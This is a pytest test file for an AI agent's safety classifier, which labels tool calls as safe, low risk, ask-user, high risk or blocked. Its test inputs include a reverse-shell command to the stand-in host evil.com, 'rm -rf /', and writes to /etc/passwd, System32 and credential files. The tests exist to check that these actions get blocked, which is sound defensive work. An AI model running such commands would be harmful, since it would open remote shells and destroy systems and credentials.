#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Copyright © 2025-2026 Wenze Wei. All Rights Reserved.
#
# This file is part of Encre.
# The Encre project belongs to the Dunimd Team.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# You may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# DISCLAIMER: Users must comply with applicable AI regulations.
# Non-compliance may result in service termination or legal liability.

"""Tests for encre.autosafety — ML-based safety classifier for auto permission mode."""

import pytest

from encre.autosafety import (
    AutoDecision,
    ClassificationResult,
    UserDecisionRecord,
    EncreAutoSafetyClassifier,
)


# ── AutoDecision Enum ────────────────────────────────────────────────────

class TestAutoDecision:
    def test_all_levels_exist(self):
        assert AutoDecision.SAFE is not None
        assert AutoDecision.LOW_RISK is not None
        assert AutoDecision.ASK_USER is not None
        assert AutoDecision.HIGH_RISK is not None
        assert AutoDecision.BLOCK is not None

    def test_distinct_values(self):
        values = {AutoDecision.SAFE, AutoDecision.LOW_RISK, AutoDecision.ASK_USER,
                   AutoDecision.HIGH_RISK, AutoDecision.BLOCK}
        assert len(values) == 5

    def test_string_representation(self):
        # Enum auto() values; they should have names
        assert AutoDecision.SAFE.name == "SAFE"
        assert AutoDecision.BLOCK.name == "BLOCK"


# ── ClassificationResult ─────────────────────────────────────────────────

class TestClassificationResult:
    def test_defaults(self):
        result = ClassificationResult(
            decision=AutoDecision.SAFE,
            confidence=0.95,
        )
        assert result.decision == AutoDecision.SAFE
        assert result.confidence == 0.95
        assert result.reasoning == ""
        assert result.tool_name == ""
        assert result.tool_args == {}
        assert result.latency_ms == 0.0

    def test_full_construction(self):
        result = ClassificationResult(
            decision=AutoDecision.BLOCK,
            confidence=1.0,
            reasoning="Critical danger: reverse shell",
            tool_name="bash",
            tool_args={"command": "bash -i >& /dev/tcp/evil.com/443 0>&1"},
            latency_ms=12.5,
        )
        assert result.decision == AutoDecision.BLOCK
        assert result.confidence == 1.0
        assert result.reasoning == "Critical danger: reverse shell"
        assert result.tool_name == "bash"
        assert result.latency_ms == 12.5

    def test_confidence_bounds(self):
        # confidence should be 0.0 to 1.0 in practice
        for val in [0.0, 0.5, 1.0]:
            result = ClassificationResult(
                decision=AutoDecision.ASK_USER,
                confidence=val,
            )
            assert 0.0 <= result.confidence <= 1.0


# ── UserDecisionRecord ───────────────────────────────────────────────────

class TestUserDecisionRecord:
    def test_defaults(self):
        rec = UserDecisionRecord(
            tool_name="bash",
            tool_args_summary="command=ls",
            user_approved=True,
        )
        assert rec.tool_name == "bash"
        assert rec.tool_args_summary == "command=ls"
        assert rec.user_approved is True
        assert rec.timestamp > 0

    def test_denied_record(self):
        rec = UserDecisionRecord(
            tool_name="file_write",
            tool_args_summary="path=/etc/hosts",
            user_approved=False,
        )
        assert rec.user_approved is False


# ── EncreAutoSafetyClassifier ──────────────────────────────────────────────

class TestEncreAutoSafetyClassifier:
    def setup_method(self):
        self.classifier = EncreAutoSafetyClassifier()

    def test_initial_state(self):
        assert self.classifier._total_classifications == 0
        assert self.classifier._cache_hits == 0
        assert len(self.classifier._cache) == 0
        assert len(self.classifier._user_decisions) == 0

    def test_default_parameters(self):
        assert self.classifier._confidence_threshold == 0.7
        assert self.classifier._cache_size == 1000

    def test_custom_parameters(self):
        c = EncreAutoSafetyClassifier(
            backend_type="anthropic",
            model="claude-haiku-4-5-20251001",
            confidence_threshold=0.85,
            cache_size=500,
        )
        assert c._backend_type == "anthropic"
        assert c._model == "claude-haiku-4-5-20251001"
        assert c._confidence_threshold == 0.85
        assert c._cache_size == 500

    def test_stats_property(self):
        stats = self.classifier.stats
        assert isinstance(stats, dict)
        assert "total_classifications" in stats
        assert "cache_hits" in stats
        assert "cache_size" in stats
        assert "cache_hit_rate" in stats
        assert "user_decisions_recorded" in stats

    def test_stats_cache_hit_rate_no_divisions(self):
        """cache_hit_rate should not divide by zero even with 0 classifications."""
        stats = self.classifier.stats
        assert stats["cache_hit_rate"] >= 0.0

    def test_learn_from_user(self):
        self.classifier.learn_from_user(
            "bash", {"command": "ls -la"}, True
        )
        assert len(self.classifier._user_decisions) == 1
        rec = self.classifier._user_decisions[0]
        assert rec.tool_name == "bash"
        assert rec.user_approved is True

    def test_learn_from_user_multiple(self):
        for i in range(5):
            self.classifier.learn_from_user("bash", {"command": f"cmd{i}"}, i % 2 == 0)
        assert len(self.classifier._user_decisions) == 5

    def test_learn_from_user_respects_cache_size(self):
        c = EncreAutoSafetyClassifier(cache_size=10)
        for i in range(20):
            c.learn_from_user("bash", {"cmd": f"cmd{i}"}, True)
        assert len(c._user_decisions) <= 10

    def test_get_user_pattern_empty(self):
        pattern = self.classifier.get_user_pattern("bash")
        assert pattern is None

    def test_get_user_pattern_with_data(self):
        self.classifier.learn_from_user("bash", {"command": "ls"}, True)
        self.classifier.learn_from_user("bash", {"command": "cat"}, True)
        self.classifier.learn_from_user("bash", {"command": "rm"}, False)
        pattern = self.classifier.get_user_pattern("bash")
        assert pattern is not None
        assert pattern["total"] == 3
        assert pattern["approved"] == 2
        assert pattern["denied"] == 1
        assert pattern["approval_rate"] == pytest.approx(2.0 / 3.0)


# ── Pattern Classification (sync) ────────────────────────────────────────

class TestPatternClassification:
    """Test the fast pattern-based pre-classification (no LLM needed)."""

    def setup_method(self):
        self.classifier = EncreAutoSafetyClassifier()

    def test_empty_bash_command_safe(self):
        result = self.classifier._pattern_classify("bash", {"command": ""})
        assert result.decision == AutoDecision.SAFE
        assert result.confidence == 1.0

    def test_safe_bash_command(self):
        result = self.classifier._pattern_classify("bash", {"command": "ls -la"})
        assert result.decision == AutoDecision.SAFE

    def test_critical_bash_blocked(self):
        result = self.classifier._pattern_classify("bash", {"command": "rm -rf /"})
        assert result.decision in (AutoDecision.BLOCK, AutoDecision.HIGH_RISK)

    def test_dangerous_path_blocked(self):
        result = self.classifier._pattern_classify(
            "file_write", {"path": "/etc/passwd"}
        )
        assert result.decision == AutoDecision.BLOCK

    def test_windows_system_path_blocked(self):
        result = self.classifier._pattern_classify(
            "file_write", {"path": "C:\\Windows\\System32\\evil.dll"}
        )
        assert result.decision == AutoDecision.BLOCK

    def test_sensitive_file_asks_user(self):
        result = self.classifier._pattern_classify(
            "file_write", {"path": "project/.env"}
        )
        assert result.decision == AutoDecision.ASK_USER

    def test_credential_file_asks_user(self):
        result = self.classifier._pattern_classify(
            "file_edit", {"file_path": "src/api_key.json"}
        )
        assert result.decision == AutoDecision.ASK_USER

    def test_normal_file_write_low_risk(self):
        result = self.classifier._pattern_classify(
            "file_write", {"path": "project/main.py"}
        )
        assert result.decision == AutoDecision.LOW_RISK

    def test_unknown_tool_asks_user(self):
        result = self.classifier._pattern_classify(
            "some_new_tool", {"arg": "val"}
        )
        assert result.decision == AutoDecision.ASK_USER


# ── Cache Key Generation ─────────────────────────────────────────────────

class TestCacheKey:
    def setup_method(self):
        self.classifier = EncreAutoSafetyClassifier()

    def test_basic_key(self):
        key = self.classifier._make_cache_key("bash", {"command": "ls"})
        assert key.startswith("bash")
        assert "command=ls" in key

    def test_key_different_args_different_keys(self):
        k1 = self.classifier._make_cache_key("bash", {"command": "ls"})
        k2 = self.classifier._make_cache_key("bash", {"command": "rm"})
        assert k1 != k2

    def test_key_same_args_same_key(self):
        k1 = self.classifier._make_cache_key("bash", {"command": "ls", "path": "/tmp"})
        k2 = self.classifier._make_cache_key("bash", {"command": "ls", "path": "/tmp"})
        assert k1 == k2

    def test_key_extracts_command_base(self):
        """Long commands should be extracted to their base command."""
        key = self.classifier._make_cache_key("bash", {"command": "ls -la /tmp"})
        assert "command=ls" in key

    def test_key_numeric_args(self):
        key = self.classifier._make_cache_key("bash", {"timeout": 30})
        assert "timeout=int" in key or "timeout" in key

    def test_cache_result(self):
        self.classifier._cache_result("test_key", ClassificationResult(
            decision=AutoDecision.SAFE, confidence=0.99
        ))
        assert "test_key" in self.classifier._cache


# ── Parse Response ───────────────────────────────────────────────────────

class TestParseResponse:
    def setup_method(self):
        self.classifier = EncreAutoSafetyClassifier()

    def test_parse_safe_response(self):
        response = '{"safe": true, "risk_level": "safe", "confidence": 0.99, "reasoning": "read only"}'
        result = self.classifier._parse_response(response)
        assert result.decision == AutoDecision.SAFE
        assert result.confidence == 0.99

    def test_parse_critical_response(self):
        response = '{"safe": false, "risk_level": "critical", "confidence": 1.0, "reasoning": "rm -rf"}'
        result = self.classifier._parse_response(response)
        assert result.decision == AutoDecision.BLOCK

    def test_parse_high_risk_response(self):
        response = '{"safe": false, "risk_level": "high", "confidence": 0.9, "reasoning": "sudo"}'
        result = self.classifier._parse_response(response)
        assert result.decision == AutoDecision.HIGH_RISK

    def test_parse_medium_risk_response(self):
        response = '{"safe": false, "risk_level": "medium", "confidence": 0.6, "reasoning": "ambiguous"}'
        result = self.classifier._parse_response(response)
        assert result.decision == AutoDecision.ASK_USER

    def test_parse_low_risk_response(self):
        response = '{"safe": true, "risk_level": "low", "confidence": 0.8, "reasoning": "local write"}'
        result = self.classifier._parse_response(response)
        assert result.decision == AutoDecision.LOW_RISK

    def test_parse_malformed_json_fallback(self):
        result = self.classifier._parse_response("not json at all")
        assert result.decision == AutoDecision.ASK_USER
        assert result.confidence == 0.0

    def test_parse_json_with_markdown_wrapper(self):
        """_parse_response handles JSON wrapped in markdown code fences."""
        response = '```json\n{"safe": true, "risk_level": "safe", "confidence": 0.99, "reasoning": "ok"}\n```'
        result = self.classifier._parse_response(response)
        assert result.decision == AutoDecision.SAFE
        assert result.confidence == 0.99

    def test_parse_with_text_before_json(self):
        response = 'Here is my evaluation:\n{"safe": false, "risk_level": "high", "confidence": 0.85, "reasoning": "danger"}'
        result = self.classifier._parse_response(response)
        assert result.decision == AutoDecision.HIGH_RISK
